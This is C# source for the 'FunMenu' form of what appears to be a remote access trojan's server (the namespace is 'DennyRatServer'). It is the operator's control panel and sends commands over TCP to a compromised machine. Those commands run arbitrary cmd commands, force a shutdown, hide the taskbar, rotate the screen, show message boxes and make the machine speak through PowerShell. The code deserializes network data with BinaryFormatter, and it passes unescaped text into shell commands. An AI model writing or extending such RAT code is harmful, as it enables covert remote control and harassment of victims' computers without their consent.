using Microsoft.WindowsAPICodePack.Net;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DennyRatServer
{
    public partial class FunMenu : Form
    {
        private TcpClient cli;
        private NetworkStream mainStream;

        private bool taskbarhidden = false;

        private MessageBoxButtons selectedbutton = MessageBoxButtons.OK;

        private int secondsUntilShutdown = 10;

        private int rotationDegrees = 0;

        public FunMenu(TcpClient ci)
        {
            cli = ci;
            InitializeComponent();
        }

        private void SendCommand(string command)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            mainStream = cli.GetStream();
            binFormatter.Serialize(mainStream, command);
        }

        private void FunMenu_Load(object sender, EventArgs e)
        {

        }

        private string ToggleTaskbar()
        {
            taskbarhidden = !taskbarhidden;

            SendCommand("toggletaskbar::" + taskbarhidden.ToString());

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);
            if(stre == "shown")
            {
                return "Taskbar Shown";
            }

            if(stre == "hidden")
            {
                return "Taskbar Hidden";
            }

            return "null";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            label1.Text = ToggleTaskbar();
        }

        private string SendCommandToCmd(string command)
        {
            SendCommand("cmdsend::" + command);

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);

            return stre;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if(textBox1.Text == "")
            {
                MessageBox.Show("Type text in textbox to play.");
                return;
            }

            string overallstr = "";
            foreach(string str in textBox1.Lines)
            {
                overallstr = overallstr + str + " ";
            }

            SendCommandToCmd("PowerShell -Command \"Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\'" + overallstr + "\');\"");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if(textBox2.TextLength <= 0)
            {
                MessageBox.Show("There must be a title");
                return;
            }

            if (textBox3.TextLength <= 0)
            {
                MessageBox.Show("There must be box text");
                return;
            }

            string fltextstr = "";
            foreach(string ln in textBox3.Lines)
            {
                fltextstr = fltextstr + ln + " ";
            }

            SendCommand("showmessagebox::" + textBox2.Text + "::" + fltextstr + "::" + selectedbutton.ToString());

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            string selected = comboBox1.GetItemText(comboBox1.SelectedItem);
            if(selected == "OK")
            {
                selectedbutton = MessageBoxButtons.OK;
            }

            if (selected == "YESNO")
            {
                selectedbutton = MessageBoxButtons.YesNo;
            }

            if (selected == "YESNOCancel")
            {
                selectedbutton = MessageBoxButtons.YesNoCancel;
            }

            if (selected == "OKCancel")
            {
                selectedbutton = MessageBoxButtons.OKCancel;
            }
        }

        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
        {
            secondsUntilShutdown = Convert.ToInt32(numericUpDown1.Value);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if(textBox4.TextLength <= 0)
            {
                MessageBox.Show("Subtext cannot be nothing");
                return;
            }

            if (secondsUntilShutdown < 10)
            {
                MessageBox.Show("Seconds until shutdown cannot be less than 10.");
                return;
            }

            SendCommandToCmd("shutdown /s /t " + secondsUntilShutdown.ToString() + " /c \"" + textBox4.Text + "\"");
        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            rotationDegrees = int.Parse(comboBox2.Text);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            SendCommand("rotatescreen::" + rotationDegrees.ToString());

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            if(textBox5.TextLength <= 0)
            {
                MessageBox.Show("There must be a title.");
                return;
            }

            if (textBox6.TextLength <= 0)
            {
                MessageBox.Show("There must be text.");
                return;
            }

            string notetitle = textBox5.Text;
            string notetxt = "";
            
            foreach(string txtln in textBox6.Lines)
            {
                notetxt = notetxt + txtln + "\n";
            }

            SendCommand("notepadmessage::" + notetxt + "::" + notetitle);

            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = cli.GetStream();
            string stre = (string)binFormatter.Deserialize(mainStream);
        }
    }
}
